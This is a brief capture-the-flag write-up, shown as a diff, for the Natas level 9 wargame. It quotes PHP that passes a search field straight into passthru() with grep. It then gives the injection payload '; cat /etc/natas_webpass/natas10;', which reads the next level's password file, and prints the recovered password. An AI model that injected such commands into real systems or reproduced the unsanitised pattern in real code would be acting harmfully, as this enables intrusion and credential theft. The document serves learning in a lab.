@@ -1,0 +1,30 @@
+On logging in with the credentials we get an online dictionary type of search where we can type words to search
+Upon checking the source code which is 
+
+ind words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+ I tried for searching for natas10 in the dictionary but It wasn't there
+ used pwd got this --/var/www/natas/natas9
+We have to use code injection to solve this
+It uses the passthru() function to searcg for 'needle' using grep
+
+; cat /etc/natas_webpass/natas10;
+
+
+Password for natas10-nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
